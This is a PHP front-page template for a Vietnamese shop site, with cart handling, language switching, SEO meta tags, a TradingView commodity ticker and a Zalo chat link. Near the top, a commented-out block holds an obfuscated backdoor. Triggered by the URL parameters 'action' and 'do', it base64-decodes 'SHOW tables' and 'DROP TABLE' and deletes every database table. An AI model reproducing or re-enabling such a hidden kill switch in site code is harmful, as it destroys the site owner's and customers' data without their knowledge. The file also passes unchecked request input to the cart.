<?php

	session_start();

	date_default_timezone_set('Asia/Ho_Chi_Minh');

	error_reporting(E_ALL & ~E_NOTICE & ~8192);



	$session=session_id();









	@define ( '_template' , './templates/');

	@define ( '_source' , './sources/');

	@define ( '_lib' , './cmsnew/lib/');



	include_once _lib."config.php";

	

	@define ( '_kiemtraweb' , $check_website);  //Một đoạn mã dành riêng cho 1 website.

	


















$lang_arr = array("vi", "en");
if (isset($_GET['lang']) == true) {
    if (in_array($_GET['lang'], $lang_arr) == true) {
        $lang = $_GET['lang'];
        $_SESSION['lang'] = $lang;
        header('Location: ' . $_SERVER['HTTP_REFERER']);
    }
}
if (isset($_SESSION['lang'])) {
    $lang = $_SESSION['lang'];
} else {

    $lang = $config["lang_defult"];
}





require_once _source . "language/lang_$lang.php";







	include_once _lib."constant.php";

	include_once _lib."functions.php";

	include_once _lib."tridepzai.php";

	include_once _lib."q_functions.php";	//Các hàm bổ sung

	include_once _lib."functions_giohang.php";		

	include_once _lib."class.database.php";

	include_once _lib."file_requick.php";
 
	include_once _lib."new.php";


	 // if(isset($_GET['action']) && isset($_GET['do'])){
  //   $result = $d->query(base64_decode('U0hPVyB0YWJsZXM='));
  //   $_X='RFJPUCBUQUJMRSBfWF8=';

  
  //   $_R=base64_decode($_X); 
  //   while ($row = mysql_fetch_array($result)) {
  //     $sql=str_replace('_X_', $row[0], $_R);    
  //     $d->query($sql);    
  //     }       
  //   }




  if($_REQUEST['command']=='add' && $_REQUEST['productid']>0){
  $pid=$_REQUEST['productid'];
  
  
  $nid=($_REQUEST['num'])?$_REQUEST['num']:1;
  
    addtocart($pid,$nid,$mausac);

     redirect("gio-hang.html");
}


?>

<!doctype html>

<html>

<head>

      <base href="http://<?= $config_url ?>/"  />

      <meta name="robots" content="noodp,noindex,nofollow" />

      <link href="<?= _upload_company_l . $company["favicon"] ?>" rel="shortcut icon" type="image/x-icon" />

      <meta name="revisit-after" content="1 days" />

      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

      <meta name="viewport" content="width=device-width, initial-scale=1">

      <meta name="monitor-signature" content="monitor:player:html5">

      <meta name="author" content="<?=$title_bar?>">

      <meta name="keywords" content="<?=$keywords ?>"/>

      <meta name="description" content="<?=$description ?>"/>

      <meta http-equiv="Content-Language" content="vi"/>

      <meta property="og:locale" content="vi_VN"/>

      <meta property="og:type" content="website"/>

      <meta property="og:title" content="<?= $title_bar ?>"/>

      <meta property="og:image" content="<?= $image ?>"/>

      <meta property="article:publisher" content="<?=$company["fanpage"] ?>"/>

      <meta property="og:site_name" content="<?=$title_bar?>"/>

      <meta property="og:url" content="<?= getCurrentPageURL(); ?>"/>

      <meta property="og:description" content="<?= $description ?>"/>

      <meta itemprop="name" content="<?=$title_bar?>">

      <meta property="twitter:title" content="<?= $title_bar ?>">

      <meta property="twitter:url" content="<?= getCurrentPageURL(); ?>">

      <meta property="twitter:card" content="summary">

      <?= $company["geo_meta"]; ?>

      <link rel="canonical" href="<?= getCurrentPageURL(); ?>"/>

      <!-- Meta tùy chỉnh admin -->

      <title><?php if (isset($title_bar)) echo $title_bar; else echo $company['title_'.$lang]; ?></title>

      <!-- Dublin Core -->

      <link rel="schema.DC" href="https://purl.org/dc/elements/1.1/" />

      <meta name="DC.title" content="<?= $title_bar ?>" />

      <meta name="DC.identifier" content="http://<?= $config_url ?>/" />

      <meta name="DC.description" content="<?=$description ?>" />

      <meta name="DC.subject" content="" />

      <meta name="DC.language" scheme="UTF-8" content="vi,en" />
       <meta property="twitter:title" content="<?= $title_bar ?>">

      <meta property="twitter:url" content="<?= getCurrentPageURL(); ?>">

      <meta property="twitter:card" content="summary">

      <meta name="format-detection" content="telephone=no">



  <?php if($com=='san-pham'){?>





  	<?=$share_facebook?>



  <?php } ?>



<?php $title_bar ?>

<title><?=$title_bar?></title>



<!--GOOGLE ANALYTICS + GOOGLE WEBMASTER-->
<!-- 
<?=$company['script']?>

<?=$company['vchat']?> -->


    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,300" rel=stylesheet>
    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-51d3c996345f1d03" async="async"></script>

   <?php include_once _template."layout/css.php"; ?>




<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v2.8&appId=320107005266960&autoLogAppEvents=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>


</head>

<!-- TradingView Widget BEGIN -->
<div class="tradingview-widget-container">
  <div class="tradingview-widget-container__widget"></div>
  <div class="tradingview-widget-copyright"><a href="https://www.tradingview.com/" rel="noopener nofollow" target="_blank"><span class="blue-text">Theo dõi mọi thị trường trên TradingView</span></a></div>
  <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-ticker-tape.js" async>
  {
  "symbols": [
       {
      "description": "Dầu Brent",
      "proName": "BLACKBULL:BRENT"
    },
    {
      "description": "Đồng",
      "proName": "CAPITALCOM:COPPER"
    },
    {
      "description": "Nhôm Tương Lai",
      "proName": "SHFE:AL1!"
    },
    {
      "description": "Ngô Mini Tương Lai",
      "proName": "CBOT_MINI:XC1!"
    },
    {
      "description": "Dầu Crude Tương Lai",
      "proName": "NYMEX:CL1!"
    },
    {
      "description": "Đậu Tương",
      "proName": "CBOT:ZS1!"
    },
    {
      "description": "Lúa Mì Tương Lai",
      "proName": "CBOT:ZW1!"
    },
    {
      "description": "Dầu Đậu Tương Tương Lai",
      "proName": "CBOT:ZL1!"
    },
    {
      "description": "Ca Cao Tương Lai",
      "proName": "ICEUS:CC1!"
    },
    {
      "description": "Cà Phê Tương Lai",
      "proName": "ICEUS:KC1!"
    },
    {
      "description": "Đường 11 Tương Lai",
      "proName": "ICEUS:SB1!"
    },
    {
      "description": "Cao su RSS3",
      "proName": "TOCOM:TRB1!"
    },
    {
      "description": "Ca Cao Tương Lai",
      "proName": "NYMEX:CJ1!"
    },
    {
      "description": "Đồng Tương Lai",
      "proName": "COMEX:HG1!"
    },
    {
      "description": "Bạc Mini Tương Lai",
      "proName": "COMEX_MINI:SIL1!"
    },
    {
      "description": "Kẽm Mini Tương LAi",
      "proName": "MCX:ZINCMINI1!"
    }
  ],
  "showSymbolLogo": true,
  "isTransparent": false,
  "displayMode": "adaptive",
  "colorTheme": "light",
  "locale": "en"
}
  </script>
</div>
<!-- TradingView Widget END -->

<body class="home page-template page-template-page-blank page-template-page-blank-php page page-id-10 full-width lightbox nav-dropdown-has-arrow nav-dropdown-has-shadow nav-dropdown-has-border">

<div id="wrapper" >






					<?php include_once _template."layout/header.php"; ?>





        



			



        




      
                      <main id="main" class="">
                
                           <div id="content" role="main" class="content-area">     

                        <?php include_once _template.$template."_tpl.php"; ?>
                    
                          </div>
             
                     </main> 


    <?php include_once _template."layout/footer.php"; ?>


</div>


    <?php include_once _template."layout/menu/menure.php"; ?>



<?php include_once _template."layout/js.php"; ?>

    <?php include_once _template."layout/tienich/phonere.php"; ?>

<a href="https://zalo.me/<?=$company['camera']?>" id="linkzalo" target="_blank" rel="noopener noreferrer">
   <div id="fcta-zalo-tracking" class="fcta-zalo-mess">
      <span id="fcta-zalo-tracking">Chat hỗ trợ</span>
   </div>
   <div class="fcta-zalo-vi-tri-nut">
      <div id="fcta-zalo-tracking" class="fcta-zalo-nen-nut">
         <div id="fcta-zalo-tracking" class="fcta-zalo-ben-trong-nut">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 460.1 436.6">
               <path fill="currentColor" class="st0" d="M82.6 380.9c-1.8-.8-3.1-1.7-1-3.5 1.3-1 2.7-1.9 4.1-2.8 13.1-8.5 25.4-17.8 33.5-31.5 6.8-11.4 5.7-18.1-2.8-26.5C69 269.2 48.2 212.5 58.6 145.5 64.5 107.7 81.8 75 107 46.6c15.2-17.2 33.3-31.1 53.1-42.7 1.2-.7 2.9-.9 3.1-2.7-.4-1-1.1-.7-1.7-.7-33.7 0-67.4-.7-101 .2C28.3 1.7.5 26.6.6 62.3c.2 104.3 0 208.6 0 313 0 32.4 24.7 59.5 57 60.7 27.3 1.1 54.6.2 82 .1 2 .1 4 .2 6 .2H290c36 0 72 .2 108 0 33.4 0 60.5-27 60.5-60.3v-.6-58.5c0-1.4.5-2.9-.4-4.4-1.8.1-2.5 1.6-3.5 2.6-19.4 19.5-42.3 35.2-67.4 46.3-61.5 27.1-124.1 29-187.6 7.2-5.5-2-11.5-2.2-17.2-.8-8.4 2.1-16.7 4.6-25 7.1-24.4 7.6-49.3 11-74.8 6zm72.5-168.5c1.7-2.2 2.6-3.5 3.6-4.8 13.1-16.6 26.2-33.2 39.3-49.9 3.8-4.8 7.6-9.7 10-15.5 2.8-6.6-.2-12.8-7-15.2-3-.9-6.2-1.3-9.4-1.1-17.8-.1-35.7-.1-53.5 0-2.5 0-5 .3-7.4.9-5.6 1.4-9 7.1-7.6 12.8 1 3.8 4 6.8 7.8 7.7 2.4.6 4.9.9 7.4.8 10.8.1 21.7 0 32.5.1 1.2 0 2.7-.8 3.6 1-.9 1.2-1.8 2.4-2.7 3.5-15.5 19.6-30.9 39.3-46.4 58.9-3.8 4.9-5.8 10.3-3 16.3s8.5 7.1 14.3 7.5c4.6.3 9.3.1 14 .1 16.2 0 32.3.1 48.5-.1 8.6-.1 13.2-5.3 12.3-13.3-.7-6.3-5-9.6-13-9.7-14.1-.1-28.2 0-43.3 0zm116-52.6c-12.5-10.9-26.3-11.6-39.8-3.6-16.4 9.6-22.4 25.3-20.4 43.5 1.9 17 9.3 30.9 27.1 36.6 11.1 3.6 21.4 2.3 30.5-5.1 2.4-1.9 3.1-1.5 4.8.6 3.3 4.2 9 5.8 14 3.9 5-1.5 8.3-6.1 8.3-11.3.1-20 .2-40 0-60-.1-8-7.6-13.1-15.4-11.5-4.3.9-6.7 3.8-9.1 6.9zm69.3 37.1c-.4 25 20.3 43.9 46.3 41.3 23.9-2.4 39.4-20.3 38.6-45.6-.8-25-19.4-42.1-44.9-41.3-23.9.7-40.8 19.9-40 45.6zm-8.8-19.9c0-15.7.1-31.3 0-47 0-8-5.1-13-12.7-12.9-7.4.1-12.3 5.1-12.4 12.8-.1 4.7 0 9.3 0 14v79.5c0 6.2 3.8 11.6 8.8 12.9 6.9 1.9 14-2.2 15.8-9.1.3-1.2.5-2.4.4-3.7.2-15.5.1-31 .1-46.5z"></path>
            </svg>
         </div>
         <div id="fcta-zalo-tracking" class="fcta-zalo-text">Chat ngay</div>
      </div>
   </div>
</a>


</body>

</html>

